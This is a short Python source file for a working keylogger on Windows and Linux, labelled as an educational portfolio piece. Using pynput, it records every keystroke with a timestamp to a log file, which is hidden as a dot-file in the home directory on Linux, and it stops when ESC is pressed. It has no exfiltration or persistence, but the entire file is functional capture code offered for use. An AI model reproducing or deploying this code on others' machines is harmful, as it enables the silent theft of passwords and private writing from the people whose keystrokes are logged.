"""
Simple Cross-Platform Keylogger for Educational Purposes
This keylogger works on both Windows and Linux systems.
For cybersecurity portfolio and educational use only.
"""

import platform
import time
import datetime
import os

# Check the operating system
operating_system = platform.system()

# Set up logging path based on OS
if operating_system == "Windows":
    log_file = os.path.join(os.getenv('TEMP'), 'keylog.txt')
    # Import Windows-specific module
    from pynput import keyboard
elif operating_system == "Linux":
    log_file = os.path.join(os.path.expanduser('~'), '.keylog.txt')
    # Import Linux-specific module
    from pynput import keyboard
else:
    print(f"Unsupported operating system: {operating_system}")
    exit(1)

def on_press(key):
    """
    Function that's called when a key is pressed
    """
    try:
        # Get the current time
        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Try to get the character
        with open(log_file, 'a') as f:
            # For regular characters
            if hasattr(key, 'char'):
                if key.char is not None:
                    f.write(f'{current_time}: {key.char}\n')
            # For special keys
            else:
                f.write(f'{current_time}: {key}\n')
    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    """
    Function that's called when a key is released
    """
    # Stop the keylogger if ESC is pressed
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

def start_keylogger():
    """
    Main function to start the keylogger
    """
    print(f"Keylogger started. Logging to {log_file}")
    print("Press ESC to stop the keylogger.")
    
    # Create log file if it doesn't exist
    with open(log_file, 'a') as f:
        f.write(f"\n--- Keylogger started at {datetime.datetime.now()} ---\n")
    
    # Start listening for keystrokes
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    print(f"Keylogger stopped. Logs saved to {log_file}")

if __name__ == "__main__":
    start_keylogger()